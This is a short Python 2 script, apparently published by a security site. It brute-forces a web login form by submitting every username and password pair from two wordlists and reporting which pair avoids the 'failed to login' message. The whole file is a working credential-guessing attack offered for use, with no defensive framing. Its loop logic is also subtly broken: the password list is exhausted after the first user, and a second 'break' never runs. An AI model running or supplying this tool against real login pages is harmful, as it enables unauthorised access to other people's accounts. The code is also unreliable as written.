#Wrot for rw-sec.com
#Author :Mohammed Mahmood


import mechanize
import sys
import time
msg = 'failed to login'

inp = sys.argv[:]
hel="""
Usage : bruteforce.py URL users passwords

Example : creatlist.py http://localhost/test/ users.txt passwords.txt

"""
if len(inp)<=3 :
    print hel
    exit()
loginurl=inp[1]
userlist = inp[2]
paslist = inp[3]
users = open(userlist,'r')
passwords = open(paslist,'r')
print '''Wrot for rw-sec.com
Author :Mohammed Mahmood'''
print '[+] Starting bruteforcing .....'
print '[+] Url : ' +loginurl

for user in users.readlines():
    for password in passwords.readlines():
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.open(str(loginurl))
        br.select_form(nr=0)
        br.form['user'] = str(user.split('\n')[0])
        br.form['pass'] = str(password.split('\n')[0])
        br.submit()
        res = str(br.response().read())
        br.close()
        if res.find(msg)==-1 :
            print '[+] Trying UserName : '+ user.split('\n')[0] +' And Password : '+ password.split('\n')[0]  + ' succesed .'
            break
            break
        else :
            print '[-] Trying UserName : ' + user.split('\n')[0] + ' And Password : ' + password.split('\n')[0] +' Failed .'

print '[+] Finished .'
